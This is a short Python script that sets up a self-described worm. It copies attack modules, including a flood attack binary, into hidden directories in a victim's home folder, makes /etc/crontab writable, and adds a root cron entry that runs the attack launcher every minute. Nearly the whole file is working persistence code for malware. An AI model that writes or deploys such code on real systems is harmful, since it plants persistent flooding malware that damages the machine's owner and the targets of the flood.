import os
import sys


attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
attackFiles = ['/Launch_Attack.py', '/SetUp_Attack.py', '/TA_Flood_Attack']
attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )'


def set_up_crontab():
    # if is_set_up_crontab():
    #     print('Already set up crontab')
    #     return

    # Write Crontab
    os.system('sudo chmod +w /etc/crontab || ( test )')

    crontab = open('/etc/crontab', 'a')

    crontab.write(attackCommand)
    crontab.write('\n')
    crontab.close()


def set_up_attack():
    if is_set_up_attack():
        print('Already set up attack module')
        return

    # Make directories
    for attackDir in attackDirs:
        os.system('sudo chmod +x TA_Flood_Attack')
        os.system('mkdir {0}'.format(attackDir))
        os.system('mkdir {0}/.module'.format(attackDir))
        os.system('cp Launch_Attack.py {0}/'.format(attackDir))
        os.system('cp SetUp_Attack.py {0}/'.format(attackDir))
        os.system('cp TA_Flood_Attack {0}/'.format(attackDir))


def is_set_up_attack():
    for attackDir in attackDirs:
        for attackFile in attackFiles:
            if not os.path.isfile(attackDir+attackFile):
                return False

    return True


def is_set_up_crontab():
    # Read Crontab
    os.system('sudo chmod +r /etc/crontab || ( test )')

    crontab = open('/etc/crontab', 'r')

    result = False

    for line in crontab:
        if line.find('Launch_Attack.py') > -1:
            result = True

    crontab.close()

    return result


def is_root():
    return os.geteuid() == 0


if __name__ == '__main__':

    if not is_root():
        sys.exit('You must run the script with \'sudo\'')

    set_up_attack()
    set_up_crontab()

    print('Set up worm success!.')
